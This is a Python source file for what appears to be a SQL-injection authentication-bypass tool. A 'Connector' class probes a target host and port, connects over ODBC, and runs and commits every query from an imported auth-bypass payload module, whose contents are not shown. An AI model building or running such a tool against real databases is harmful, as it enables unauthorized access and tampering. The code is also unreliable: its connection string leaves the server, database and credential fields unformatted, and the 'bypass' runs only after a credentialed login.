try:
    import pyodbc
except ImportError:
    install_pyodbc = input("pyodbc is not installed. Do you want to install pyodbc? (y/n): ")
    if install_pyodbc.lower() == "y":
        try:
            import subprocess
            subprocess.check_call(["pip", "install", "pyodbc"])
        except (subprocess.CalledProcessError, subprocess.SubprocessError, subprocess.TimeoutExpired) as exc:
            print(exc)
    elif install_pyodbc.lower() == "n":
        pass

try:
    import requests
except ImportError:
    install_requests = input("requests is not installed. Do you want to install requests? (y/n): ")
    if install_requests.lower() == "y":
        try:
            import subprocess
            subprocess.check_call(["pip", "install", "requests"])
        except (subprocess.CalledProcessError, subprocess.SubprocessError, subprocess.TimeoutExpired) as exc:
            print(exc)
    elif install_requests.lower() == "n":
        pass

try:
    from Package import logger
    from Package import payload4authpypass as AUTHPAYLOAD
except ImportError:
    print("[*] Wrong installation")

import socket


class Connector:
    def __init__(self, host, port, user, password, database, driver, *args, **kwargs):
        self.host = host
        self.port = port
        self.user = user
        self.password = password
        self.database = database
        self.driver = driver
        self.args = args
        self.kwargs = kwargs

    @classmethod
    def _Check_host(cls, host):
        if host is None:
            raise ValueError("Host is None")
        
        req = requests.get(host)
        try:
            assert req.status_code == 200, "Host is not reachable"
        except AssertionError:
            return False
        
        return True

    @classmethod
    def _Check_port(cls, port, host):
        try:
            with socket.create_connection((host, port), timeout=10):
                return True
        except (socket.timeout, socket.error):
            return False

    @classmethod
    def _Final_check(cls, host, port):
        if cls._Check_host(host) and cls._Check_port(port, host):
            return True
        else:
            raise SystemExit

    @classmethod
    def _Connect(cls, host, port, user, password, database, driver, *args, **kwargs):
        connection_string = 'DRIVER={DriverName};SERVER=ServerName;DATABASE=DatabaseName;UID=Username;PWD=Password'
        connection = pyodbc.connect(connection_string.format(DriverName=driver, ServerName=host, DatabaseName=database, Username=user, Password=password))
        cursor = connection.cursor()
        if cursor:
            return True
        else:
            return False
        
    @classmethod
    def Auth_bypass_injection(cls, host, port, user, password, database, driver, *args, **kwargs):
        if cls._Connect(host, port, user, password, database, driver, *args, **kwargs):
            connection_string = 'DRIVER={DriverName};SERVER=ServerName;DATABASE=DatabaseName;UID=Username;PWD=Password'
            connection = pyodbc.connect(connection_string.format(DriverName=driver, ServerName=host, DatabaseName=database, Username=user, Password=password))
            cursor = connection.cursor()
            for Q in AUTHPAYLOAD.payload4auth_bypass():
                cursor.execute(Q)
                connection.commit()
        else:
            raise SystemExit
        


